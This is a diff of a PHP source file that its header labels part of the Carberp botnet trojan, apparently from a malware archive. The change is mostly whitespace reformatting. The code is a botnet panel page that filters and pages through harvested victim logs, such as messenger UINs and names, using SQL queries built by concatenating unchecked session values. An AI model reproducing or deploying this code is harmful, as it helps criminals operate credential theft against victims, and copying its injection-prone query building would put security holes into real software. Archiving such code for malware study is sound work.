@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 $smarty->allow_php_tag = true;
 $page['count_page'] = 100;
@@ -6,15 +17,19 @@ if(file_exists('cache/pid_import.txt')){
 	$smarty->assign('import', true);
 }
 
-function name_var($i){	return 'v' . $i;
+function name_var($i){
+	return 'v' . $i;
 }
 
-if(!empty($Cur['id'])){	$id = $Cur['id'];
+if(!empty($Cur['id'])){
+	$id = $Cur['id'];
 	$filter = $mysqli->query('SELECT * FROM bf_filters WHERE (id = \''.$id.'\') LIMIT 1');
 	$filter->fields = json_decode(base64_decode($filter->fields));
-}elseif(!empty($Cur['str'])){	$id = $Cur['str'];
+}elseif(!empty($Cur['str'])){
+	$id = $Cur['str'];
 	$filter->str = $id;
-	switch($id){		case 'messengers':
+	switch($id){
+		case 'messengers':
         	$filter->name = 'Мессанджеры';
         	$filter->id = 'messengers';
         	$filter->fields->name[] = 'UIN/Name';
@@ -54,10 +69,12 @@ if(!empty($Cur['id'])){	$id = $Cur['id'];
 	}
 }
 
-if(empty($id)){	exit;
+if(empty($id)){
+	exit;
 }
 
-if(is_array($_SESSION['gsearch'])){	$_POST['prefix'] = $_SESSION['gsearch']['prefix'];
+if(is_array($_SESSION['gsearch'])){
+	$_POST['prefix'] = $_SESSION['gsearch']['prefix'];
 	$_POST['mask_uid'] = $_SESSION['gsearch']['data'];
 }
 
@@ -102,7 +119,8 @@ if(!empty($_SESSION['prefix_' . $id])){
 	$sql .= '(prefix=\''.$_SESSION['prefix_' . $id].'\')';
 }
 
-if(!empty($_SESSION['mask_uid_' . $id])){	if(!empty($sql)) $sql .= ' AND ';
+if(!empty($_SESSION['mask_uid_' . $id])){
+	if(!empty($sql)) $sql .= ' AND ';
 	$_POST['mask_uid'] = $_SESSION['mask_uid_' . $id];
 	$sql .= '(uid LIKE \'%'.$_SESSION['mask_uid_' . $id].'%\')';
 }
@@ -136,11 +154,17 @@ if(!empty($_SESSION['type_' . $id])){
 }
 
 if(!empty($_SESSION['data1_' . $id]) && !empty($_SESSION['data2_' . $id])){
-	if($_SESSION['data1_' . $id] != 'ALL' && $_SESSION['data2_' . $id] != 'ALL'){		if(!empty($sql)) $sql .= ' AND ';
-		if($_SESSION['data1_' . $id] == $_SESSION['data2_' . $id]){			$sql .= '(post_date > \''.$_SESSION['data1_' . $id].' 00:00:00\')';
-		}else{			if($_SESSION['data1_' . $id] == 'ALL'){				$sql .= '(post_date < \''.$_SESSION['data2_' . $id].' 23:59:59\')';
-			}elseif($_SESSION['data2_' . $id] == 'ALL'){				$sql .= '(post_date > \''.$_SESSION['data1_' . $id].' 00:00:00\')';
-			}else{				$sql .= '(post_date > \''.$_SESSION['data1_' . $id].' 00:00:00\') AND (post_date < \''.$_SESSION['data2_' . $id].' 23:59:59\')';
+	if($_SESSION['data1_' . $id] != 'ALL' && $_SESSION['data2_' . $id] != 'ALL'){
+		if(!empty($sql)) $sql .= ' AND ';
+		if($_SESSION['data1_' . $id] == $_SESSION['data2_' . $id]){
+			$sql .= '(post_date > \''.$_SESSION['data1_' . $id].' 00:00:00\')';
+		}else{
+			if($_SESSION['data1_' . $id] == 'ALL'){
+				$sql .= '(post_date < \''.$_SESSION['data2_' . $id].' 23:59:59\')';
+			}elseif($_SESSION['data2_' . $id] == 'ALL'){
+				$sql .= '(post_date > \''.$_SESSION['data1_' . $id].' 00:00:00\')';
+			}else{
+				$sql .= '(post_date > \''.$_SESSION['data1_' . $id].' 00:00:00\') AND (post_date < \''.$_SESSION['data2_' . $id].' 23:59:59\')';
 			}
 		}
 	}
@@ -152,7 +176,8 @@ if(!empty($sql)) $sql = ' WHERE ' . $sql;
 
 $table_check = $mysqli->table_check('bf_filter_'.$id);
 
-if($table_check->Name != 'bf_filter_'.$id){	print('<hr /><div align="center" style="font-size: 16px; font-weight:bold">БД фильтра не найден!</div><hr />');
+if($table_check->Name != 'bf_filter_'.$id){
+	print('<hr /><div align="center" style="font-size: 16px; font-weight:bold">БД фильтра не найден!</div><hr />');
 	exit;
 }else{
 	$logs = $mysqli->query('SELECT * FROM bf_filter_' . $id . $sql . ' ORDER by post_date DESC LIMIT ' . ($Cur['page'] == 0 ? 0 : $Cur['page']*$page['count_page']).','.$page['count_page'], null, null, false);
